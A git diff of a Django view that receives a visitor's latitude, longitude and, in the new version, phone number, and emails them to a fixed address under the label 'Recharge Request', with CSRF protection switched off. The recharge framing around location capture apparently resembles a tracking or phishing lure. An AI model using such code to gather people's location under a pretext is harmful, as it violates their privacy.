@@ -4,27 +4,34 @@ from django.views.decorators.csrf import csrf_exempt
 import json
 from django.core.mail import send_mail
 
-# For GET request: display the HTML page
 def home(request):
     return render(request, 'home.html')
 
-# For POST request: save location and send email
 @csrf_exempt
 def save_location(request):
     if request.method == "POST":
-        data = json.loads(request.body)
-        latitude = data.get("latitude")
-        longitude = data.get("longitude")
+        try:
+            data = json.loads(request.body.decode('utf-8'))
+            latitude = data.get("latitude")
+            longitude = data.get("longitude")
+            phone = data.get("phone")
 
-        # Generate Google Maps link
-        google_maps_link = f"https://www.google.com/maps?q={latitude},{longitude}"
+            if not phone:
+                return JsonResponse({"error": "Phone number required"}, status=400)
 
-        # Email content
-        subject = "Live Location Update"
-        message = f"User's Location:\nLatitude: {latitude}\nLongitude: {longitude}\n\nView on Google Maps: {google_maps_link}"
+            location_text = f"Latitude: {latitude}, Longitude: {longitude}" if latitude and longitude else "Location not provided"
 
-        send_mail(subject, message, "swapeatmail@gmail.com", ["piyushmodi812@gmail.com"])
+            # Email content
+            subject = "Recharge Request + Location"
+            message = f"Phone: {phone}\nLocation: {location_text}"
 
-        return JsonResponse({"message": "Location received and email sent"})
-    
-    return JsonResponse({"error": "Invalid request"}, status=400)
+            send_mail(
+                subject, message, "your_email@gmail.com", ["your_admin@gmail.com"]
+            )
+
+            return JsonResponse({"message": "Recharge request received"})
+
+        except json.JSONDecodeError:
+            return JsonResponse({"error": "Invalid JSON format"}, status=400)
+
+    return JsonResponse({"error": "Invalid request method"}, status=400)
